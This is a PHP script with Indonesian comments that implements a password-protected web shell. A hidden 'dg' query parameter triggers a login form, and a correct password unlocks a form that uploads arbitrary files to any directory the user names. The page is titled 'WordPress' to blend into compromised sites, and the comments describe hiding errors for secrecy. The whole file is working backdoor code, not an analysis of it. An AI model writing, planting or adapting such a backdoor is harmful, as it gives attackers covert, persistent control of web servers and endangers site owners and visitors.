<?php

/**
 * Mendapatkan direktori kerja saat ini.
 *
 * @return string Path direktori saat ini.
 */
function customdir() {
    if (function_exists("getcwd")) {
        return @getcwd();
    } else {
        return dirname($_SERVER["SCRIPT_FILENAME"]);
    }
}

/**
 * Memeriksa apakah password yang diberikan cocok dengan hash yang disimpan.
 *
 * @param string $pw Password yang akan diperiksa.
 * @return bool True jika cocok, false jika tidak.
 */
function checkpw($pw) {
    $hash = '5daf8cfbc80097bf0fc4df6056ef9c29f968913aa2f3fd1d46748fb6a8a2e0d3';
    return hash('sha256', $pw) === $hash;
}

// --- Bagian Autentikasi ---

// Cek apakah ada request untuk login (dg) dan password dikirim via POST.
if (isset($_GET["dg"]) && isset($_POST["p"])) {
    if (checkpw($_POST["p"])) {
        // Jika password benar, set cookie yang berlaku 1 hari.
        @setcookie("p", $_POST["p"], time() + 86400, "/");
    }
}

// --- Bagian Upload File (Hanya jika berhasil login) ---

// Cek apakah ada request untuk login (dg), cookie password ada, dan password di cookie valid.
if (isset($_GET["dg"]) && isset($_COOKIE["p"]) && checkpw($_COOKIE["p"])) {
    // Matikan pelaporan error untuk menjaga kerahasiaan.
    @error_reporting(E_ALL ^ E_NOTICE);
    
    $current_dir = str_replace("\\", "/", @customdir()) . "/";

    echo "<html><title>WordPress</title><body>";
    
    // Form untuk upload file dan mengubah direktori kerja.
    echo '<form onSubmit="this.up.disabled=true;" method="post" enctype="multipart/form-data">';
    echo 'Dir: <input size="250" type="text" name="cwd" value="' . $current_dir . '">';
    echo '<p><input type="file" name="file">';
    echo '<input name="up" type="submit" value="Upload">';
    echo '</form>';

    // Proses upload file jika ada file yang dikirim.
    if (isset($_FILES['file'])) {
        // Ubah permission direktori dan file .htaccess (jika ada).
        @chmod($_POST['cwd'] . '/', 0755);
        @chmod($_POST['cwd'] . '/.htaccess', 0644);

        // Pindahkan file yang diupload ke direktori tujuan.
        if (@move_uploaded_file($_FILES['file']['tmp_name'], $_POST['cwd'] . '/' . $_FILES['file']['name'])) {
            echo '<h2><center>Succes...!</center></h2>';
        } else {
            echo '<h2><center>ERROR...!</center></h2>';
        }
    }

    echo '</body></html>';
} 
// --- Bagian Tampilan Login (Jika belum login) ---
elseif (isset($_GET["dg"])) {
    // Tampilkan form login sederhana.
    echo '<form method="post">';
    echo '<input id="erenyeager" type="text" name="p">';
    echo '<button>login</button>';
    echo '</form>';
}

?>
